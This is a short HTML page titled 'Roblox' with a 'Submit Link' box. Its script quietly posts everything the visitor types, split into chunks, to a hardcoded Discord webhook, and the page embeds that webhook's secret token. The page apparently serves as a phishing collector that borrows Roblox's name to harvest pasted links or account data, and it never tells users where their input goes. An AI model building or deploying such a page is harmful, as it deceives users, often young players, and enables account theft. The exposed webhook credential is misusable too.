<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f4f4f4;
    }
    input, textarea, button {
      padding: 10px;
      margin: 5px;
      font-size: 16px;
    }
    textarea {
      width: 300px;
      height: 100px;
      resize: none;
    }
  </style>
</head>
<body>

  <h2>Submit Link</h2>
  <textarea id="message" placeholder="Type your message here"></textarea>
  <button onclick="sendMessage()">Send</button>

  <script>
    const MAX_LENGTH = 1999; // safe character limit

    async function sendMessage() {
      const message = document.getElementById('message').value;
      if (!message) {
        alert("Please type something!");
        return;
      }

      const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";

      // Split the message into chunks of MAX_LENGTH
      const chunks = [];
      for (let i = 0; i < message.length; i += MAX_LENGTH) {
        chunks.push(message.substring(i, i + MAX_LENGTH));
      }

      try {
        for (let chunk of chunks) {
          const response = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: chunk })
          });

          if (!response.ok) {
            alert("Failed to send message chunk.");
            return;
          }
        }

        alert("Message sent in " + chunks.length + " parts!");
        document.getElementById('message').value = "";
      } catch (error) {
        alert("Error: " + error);
      }
    }
  </script>

</body>
</html>
